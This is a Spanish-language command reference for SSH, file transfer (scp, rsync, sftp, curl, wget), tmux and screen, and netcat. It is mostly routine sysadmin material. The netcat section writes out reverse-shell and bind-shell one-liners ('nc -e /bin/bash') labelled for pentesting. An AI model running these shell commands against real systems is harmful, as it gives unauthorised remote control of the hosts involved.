# Sesión y Comunicación Remota

SSH, transferencia de archivos, túneles y herramientas de comunicación entre sistemas.

---

## 1. SSH — Secure Shell

### Conexión básica

```bash
ssh usuario@host                 # Conexión básica
ssh usuario@192.168.1.100        # Con IP
ssh -p 2222 usuario@host         # Puerto personalizado
ssh -i ~/.ssh/id_rsa usuario@host  # Con clave específica
ssh -v usuario@host              # Verbose (debug nivel 1)
ssh -vvv usuario@host            # Debug máximo (nivel 3)
ssh -X usuario@host              # Reenvío de X11 (apps gráficas remotas)
ssh -Y usuario@host              # X11 confiable (menos seguro)
ssh -A usuario@host              # Agent forwarding (propaga tu clave al servidor)
ssh -N usuario@host              # Sin ejecutar comando (solo túnel)
ssh -f usuario@host              # En background
ssh -T usuario@host              # Sin pseudo-terminal (útil para scripts)
ssh -q usuario@host              # Silencioso (quiet)
ssh -o StrictHostKeyChecking=no usuario@host  # Sin verificar fingerprint (inseguro)
ssh -o ConnectTimeout=5 usuario@host  # Timeout de conexión
ssh -o BatchMode=yes usuario@host     # Sin interacción (para scripts)
```

### Ejecutar comandos remotos

```bash
ssh usuario@host "comando"               # Ejecutar un comando y salir
ssh usuario@host "ls -la /var/www"      # Con argumento
ssh usuario@host "df -h; free -h; uptime"  # Múltiples comandos
ssh usuario@host "sudo systemctl restart nginx"  # Con sudo
ssh usuario@host 'bash -s' < script.sh  # Ejecutar script local en remoto
ssh usuario@host "cat /etc/passwd" > local.txt  # Guardar salida localmente
cat local.txt | ssh usuario@host "cat > /ruta/remota.txt"  # Enviar datos
```

### Generación y gestión de claves

```bash
# Generar par de claves
ssh-keygen                              # Interactivo (RSA por defecto)
ssh-keygen -t ed25519 -C "comentario"  # Ed25519 (recomendado — más seguro y rápido)
ssh-keygen -t rsa -b 4096 -C "alice@empresa.com"  # RSA 4096 bits
ssh-keygen -t ecdsa -b 521             # ECDSA 521 bits
ssh-keygen -f ~/.ssh/mi_clave          # Nombre de archivo personalizado
ssh-keygen -N "passphrase"             # Con passphrase específica
ssh-keygen -N ""                       # Sin passphrase (inseguro, solo para automatización)

# Copiar clave pública al servidor
ssh-copy-id usuario@host               # Método estándar (recomendado)
ssh-copy-id -i ~/.ssh/mi_clave.pub usuario@host  # Clave específica
ssh-copy-id -p 2222 usuario@host       # Puerto personalizado
# Manual:
cat ~/.ssh/id_ed25519.pub | ssh usuario@host "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Gestión de claves conocidas
ssh-keygen -R host                     # Eliminar host de known_hosts
ssh-keyscan host                       # Obtener fingerprint del host
ssh-keyscan -H host >> ~/.ssh/known_hosts  # Añadir sin conectar (con hash)
ssh-keygen -l -f ~/.ssh/known_hosts    # Listar fingerprints de hosts conocidos

# ssh-agent — gestión de claves en memoria
eval $(ssh-agent)                      # Iniciar el agente
ssh-add ~/.ssh/id_ed25519              # Añadir clave al agente
ssh-add -l                             # Listar claves cargadas
ssh-add -d ~/.ssh/id_ed25519           # Eliminar clave del agente
ssh-add -D                             # Eliminar todas las claves
ssh-add -t 3600 ~/.ssh/id_ed25519      # Con timeout de 1 hora

# Cambiar passphrase de una clave existente
ssh-keygen -p -f ~/.ssh/id_rsa

# Ver fingerprint de una clave
ssh-keygen -l -f ~/.ssh/id_ed25519.pub
ssh-keygen -lv -f ~/.ssh/id_ed25519.pub  # Con arte visual
```

### Configuración del cliente SSH

Archivo: `~/.ssh/config`

```
# Host genérico para accesos rápidos
Host servidor-prod
    HostName 192.168.1.100
    User alice
    Port 2222
    IdentityFile ~/.ssh/id_ed25519_prod
    ForwardAgent yes

# Bastión / Jump host
Host interno
    HostName 10.0.0.50
    User bob
    ProxyJump bastion.empresa.com

# Configuración global
Host *
    ServerAliveInterval 60        # Keepalive cada 60s
    ServerAliveCountMax 3         # Máximo 3 intentos antes de desconectar
    ConnectTimeout 10             # Timeout de conexión
    ControlMaster auto            # Multiplexar conexiones
    ControlPath ~/.ssh/sockets/%r@%h:%p  # Socket de multiplexado
    ControlPersist 10m            # Mantener control socket 10 minutos
    AddKeysToAgent yes            # Añadir clave al agente automáticamente
    IdentityFile ~/.ssh/id_ed25519
```

```bash
# Usar la configuración
ssh servidor-prod                # Usa la config del bloque Host servidor-prod
ssh interno                      # Salta por el bastión automáticamente
```

### Túneles SSH

```bash
# Local forwarding: puerto local → servicio remoto
# Acceder a http://remoto:8080 como http://localhost:8080
ssh -L 8080:localhost:8080 usuario@remoto
ssh -L 8080:10.0.0.10:80 usuario@bastion  # A través de un intermediario
ssh -L 5432:db-server:5432 usuario@remoto -N  # Base de datos PostgreSQL

# Remote forwarding: puerto remoto → servicio local
# Exponer un servicio local al mundo exterior a través del servidor
ssh -R 4444:localhost:4444 usuario@remoto  # El remoto expone el 4444
ssh -R 80:localhost:3000 usuario@remoto    # App local accesible en remoto:80

# Dynamic SOCKS proxy (proxy completo — para navegar por la red del servidor)
ssh -D 1080 usuario@remoto -N              # SOCKS5 en localhost:1080
# Configurar navegador para usar SOCKS5 en 127.0.0.1:1080

# Jump host (ProxyJump — recomendado sobre ProxyCommand)
ssh -J bastion usuario@destino_interno
ssh -J user1@bastion1,user2@bastion2 user3@destino  # Múltiples saltos

# ProxyCommand (forma clásica)
ssh -o ProxyCommand="ssh -W %h:%p usuario@bastion" usuario@interno
```

### Servidor SSH — Configuración

Archivo: `/etc/ssh/sshd_config`

```bash
# Configuración recomendada (hardening)
Port 22                          # Cambiar a no estándar reduce ruido de bots
ListenAddress 0.0.0.0

# Autenticación
PermitRootLogin no               # NUNCA permitir root por SSH
PasswordAuthentication no        # Desactivar auth por contraseña (solo claves)
PubkeyAuthentication yes         # Habilitar autenticación por clave
AuthorizedKeysFile .ssh/authorized_keys
MaxAuthTries 3                   # Máximo intentos de autenticación

# Restricciones de usuario
AllowUsers alice bob             # Solo estos usuarios pueden entrar
DenyUsers mallory                # Bloquear usuario específico
AllowGroups sshusers             # Solo usuarios del grupo sshusers

# Seguridad adicional
X11Forwarding no                 # Deshabilitar si no se necesita
AllowAgentForwarding no          # Deshabilitar si no se necesita
PermitEmptyPasswords no
MaxStartups 10:30:60             # Limitar conexiones simultáneas no autenticadas
LoginGraceTime 30                # 30 segundos para autenticarse
ClientAliveInterval 300          # Keepalive cada 5 minutos
ClientAliveCountMax 2            # Desconectar tras 2 keepalives sin respuesta
Banner /etc/ssh/banner           # Mostrar banner legal antes de login

# Aplicar cambios
sudo sshd -t                     # Verificar sintaxis antes de reiniciar
sudo systemctl reload sshd       # Recargar (sin interrumpir conexiones activas)
sudo systemctl restart sshd      # Reiniciar completo
```

---

## 2. Transferencia de Archivos

### SCP — Secure Copy

```bash
# Local → Remoto
scp archivo.txt usuario@host:/destino/
scp archivo.txt usuario@host:/destino/nuevo_nombre.txt
scp -r directorio/ usuario@host:/destino/    # Recursivo
scp -P 2222 archivo usuario@host:/destino/  # Puerto personalizado
scp -i ~/.ssh/mi_clave archivo usuario@host:/destino/  # Clave específica
scp -C archivo usuario@host:/destino/        # Con compresión
scp -p archivo usuario@host:/destino/        # Preservar timestamps y permisos

# Remoto → Local
scp usuario@host:/remoto/archivo.txt .
scp usuario@host:/remoto/*.log /local/logs/
scp -r usuario@host:/remoto/directorio/ ./local/

# Remoto → Remoto (a través del cliente local)
scp usuario1@host1:/archivo.txt usuario2@host2:/destino/
```

### rsync — Sincronización Eficiente

```bash
# Básico
rsync -av origen/ destino/               # Local, con verbose
rsync -av origen/ usuario@host:/destino/ # A servidor remoto
rsync -av usuario@host:/origen/ ./local/ # Desde servidor remoto

# Opciones importantes
-a    # Archive: recursivo + preserva permisos, timestamps, symlinks, dueño, grupo
-v    # Verbose
-z    # Compresión durante la transferencia
-P    # Progreso + mantener archivos parciales
-n    # Dry-run: simula sin hacer nada (probar antes de ejecutar)
--delete          # Borra en destino lo que no está en origen (espejo exacto)
--exclude="*.log" # Excluir patrones
--include="*.conf" --exclude="*"  # Solo incluir ciertos archivos
--bwlimit=1024    # Limitar ancho de banda a 1024 KB/s
--checksum        # Comparar por checksum en lugar de fecha/tamaño (más lento pero preciso)
--backup --backup-dir=/backups/  # Crear backups de los archivos sobreescritos
-e "ssh -p 2222"  # SSH en puerto personalizado

# Ejemplos comunes
rsync -avz --progress origen/ usuario@host:/destino/    # Con progreso
rsync -av --delete /var/www/ /backup/www/               # Espejo de directorio web
rsync -av --exclude={'.git','node_modules','*.log'} proyecto/ servidor:/opt/proyecto/
rsync -avzn origen/ destino/                            # Dry-run (ver qué haría)

# Sincronización en ambos sentidos (cuidado con conflictos)
# Usar unison para sincronización bidireccional real
```

### SFTP — SSH File Transfer Protocol

```bash
sftp usuario@host                # Abrir sesión interactiva
sftp -P 2222 usuario@host        # Puerto personalizado

# Comandos dentro de sftp:
# ls / lls          → listar remoto / local
# cd / lcd          → cambiar directorio remoto / local
# pwd / lpwd        → directorio actual remoto / local
# get archivo       → descargar
# get -r directorio → descargar recursivo
# put archivo       → subir
# put -r directorio → subir recursivo
# mget *.txt        → descargar múltiples
# mput *.txt        → subir múltiples
# mkdir / rmdir     → crear / eliminar directorio
# rm archivo        → eliminar en remoto
# chmod             → cambiar permisos en remoto
# df -h             → espacio en disco remoto
# exit / quit / bye → salir

# SFTP no interactivo (batch mode)
sftp -b comandos.txt usuario@host
echo "get /remoto/archivo.txt /local/" | sftp usuario@host
```

### wget y curl

```bash
# wget — descarga de archivos
wget https://ejemplo.com/archivo.zip
wget -O nuevo_nombre.zip https://ejemplo.com/archivo.zip
wget -c https://ejemplo.com/archivo.zip     # Continuar descarga interrumpida
wget -q https://ejemplo.com/archivo         # Silencioso
wget -b https://ejemplo.com/archivo         # Background
wget --user=alice --password=pass123 https://ejemplo.com/privado/
wget -r -l 2 --no-parent https://sitio.com/ # Recursivo, profundidad 2

# curl — cliente HTTP/S versátil
curl -O https://ejemplo.com/archivo.zip     # Descargar (nombre original)
curl -o archivo.zip https://ejemplo.com/   # Nombre personalizado
curl -L https://ejemplo.com/redirect       # Seguir redirecciones
curl -k https://self-signed.com/           # Ignorar errores SSL
curl -u alice:pass123 https://ejemplo.com/ # Autenticación básica
curl -H "Authorization: Bearer TOKEN" https://api.ejemplo.com/  # Header JWT
curl -X POST -d '{"key":"val"}' -H "Content-Type: application/json" https://api.com/  # POST JSON
curl -X PUT -d @archivo.json https://api.com/recurso/1  # PUT desde archivo
curl -X DELETE https://api.com/recurso/1   # DELETE
curl -I https://ejemplo.com/              # Solo cabeceras HTTP (HEAD)
curl -v https://ejemplo.com/             # Verbose (ver request y response completos)
curl -s https://ejemplo.com/ | grep "título"  # Silencioso (para pipes)
curl --retry 3 --retry-delay 5 https://ejemplo.com/  # Reintentos
curl -w "%{http_code}\n" -o /dev/null -s https://ejemplo.com/  # Solo código HTTP
curl --limit-rate 1M https://ejemplo.com/archivo  # Limitar velocidad
curl --max-time 10 https://ejemplo.com/   # Timeout de 10 segundos
curl --connect-timeout 5 https://ejemplo.com/  # Timeout de conexión
```

---

## 3. Screen y Tmux — Multiplexores de Terminal

### screen

```bash
screen                           # Nueva sesión
screen -S nombre                 # Sesión con nombre
screen -ls                       # Listar sesiones activas
screen -r                        # Reconectar a la única sesión
screen -r nombre                 # Reconectar a sesión por nombre
screen -r 12345                  # Reconectar por PID
screen -d nombre                 # Detach sesión en ejecución
screen -x nombre                 # Adjuntarse a sesión ya adjunta (compartida)
screen -D -R                     # Detach + reconectar (o crear si no existe)
screen -wipe                     # Limpiar sesiones muertas

# Atajos dentro de screen (prefijo: Ctrl+A)
Ctrl+A d         # Detach (dejar en background)
Ctrl+A c         # Nueva ventana
Ctrl+A n         # Siguiente ventana
Ctrl+A p         # Ventana anterior
Ctrl+A "         # Lista de ventanas
Ctrl+A A         # Renombrar ventana actual
Ctrl+A S         # Dividir horizontalmente
Ctrl+A |         # Dividir verticalmente
Ctrl+A Tab       # Cambiar entre paneles
Ctrl+A X         # Cerrar panel actual
Ctrl+A k         # Matar ventana actual
Ctrl+A [         # Modo scroll (q para salir)
```

### tmux (recomendado)

```bash
tmux                             # Nueva sesión
tmux new -s trabajo              # Sesión con nombre
tmux ls                          # Listar sesiones
tmux a                           # Adjuntar a la última sesión
tmux a -t trabajo                # Adjuntar a sesión por nombre
tmux kill-session -t trabajo     # Matar sesión
tmux kill-server                 # Matar todas las sesiones

# Atajos dentro de tmux (prefijo: Ctrl+B)
Ctrl+B d         # Detach
Ctrl+B c         # Nueva ventana
Ctrl+B n         # Siguiente ventana
Ctrl+B p         # Ventana anterior
Ctrl+B l         # Última ventana usada
Ctrl+B 0-9       # Ir a ventana por número
Ctrl+B ,         # Renombrar ventana
Ctrl+B &         # Cerrar ventana (con confirmación)
Ctrl+B %         # Dividir panel verticalmente
Ctrl+B "         # Dividir panel horizontalmente
Ctrl+B ←↑↓→     # Navegar entre paneles
Ctrl+B z         # Zoom al panel actual (toggle)
Ctrl+B x         # Cerrar panel actual
Ctrl+B [         # Modo scroll (q para salir, Enter para copiar)
Ctrl+B ]         # Pegar desde buffer tmux
Ctrl+B $         # Renombrar sesión
Ctrl+B s         # Lista de sesiones interactiva
Ctrl+B t         # Mostrar reloj
Ctrl+B ?         # Ayuda

# tmux.conf — configuración personalizada
cat >> ~/.tmux.conf << 'EOF'
# Cambiar prefijo a Ctrl+A (más cómodo)
unbind C-b
set-option -g prefix C-a
bind-key C-a send-prefix

# Ratón habilitado
set -g mouse on

# Historial más grande
set -g history-limit 10000

# Numeración desde 1
set -g base-index 1

# Recargar configuración
bind r source-file ~/.tmux.conf \; display "Config recargada"
EOF
```

---

## 4. netcat (nc) — La Navaja Suiza de Redes

```bash
# Conexión TCP
nc host 80                       # Conectar al puerto 80
nc -u host 53                    # UDP
nc -v host 443                   # Verbose
nc -w 5 host 80                  # Timeout de 5 segundos

# Servidor/escuchador
nc -l 4444                       # Escuchar en puerto 4444
nc -lv 4444                      # Con verbose
nc -lvnp 4444                    # Verbose, no DNS, puerto específico

# Escaneo de puertos (básico)
nc -zv host 20-25                # Escanear rango
nc -zvn 192.168.1.1 80 443 8080  # Puertos específicos

# Transferencia de archivos
nc -l 4444 > recibido.txt        # Receptor
nc host 4444 < archivo.txt       # Emisor

nc -l 4444 | tar xvf -           # Recibir directorio comprimido
tar cvf - /ruta/ | nc host 4444  # Enviar directorio comprimido

# Chat simple
nc -l 4444                       # Terminal 1: servidor
nc host 4444                     # Terminal 2: cliente

# Reverse shell (pentesting)
nc -e /bin/bash host 4444        # Victim (Linux con -e)
nc -lvnp 4444                    # Attacker (listener)

# Bind shell
nc -lvnp 4444 -e /bin/bash       # Victim: escucha y da shell
nc host 4444                     # Attacker: conecta y recibe shell

# Ver banner de un servicio
echo "" | nc -w1 host 22         # Banner SSH
echo "HEAD / HTTP/1.0\r\n" | nc host 80  # Cabeceras HTTP
```

---

## 5. Archivos de Configuración SSH

| Archivo | Descripción |
|---|---|
| `~/.ssh/config` | Configuración del cliente SSH (alias, opciones por host) |
| `~/.ssh/known_hosts` | Fingerprints de servidores conocidos |
| `~/.ssh/authorized_keys` | Claves públicas autorizadas para acceder |
| `~/.ssh/id_ed25519` | Clave privada (permisos: 600) |
| `~/.ssh/id_ed25519.pub` | Clave pública (permisos: 644) |
| `/etc/ssh/sshd_config` | Configuración del servidor SSH |
| `/etc/ssh/ssh_config` | Configuración global del cliente |
| `/etc/ssh/ssh_host_*` | Claves del host del servidor |

```bash
# Permisos correctos para SSH (OBLIGATORIO)
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_ed25519
chmod 644 ~/.ssh/id_ed25519.pub
chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/config
chmod 644 ~/.ssh/known_hosts
```
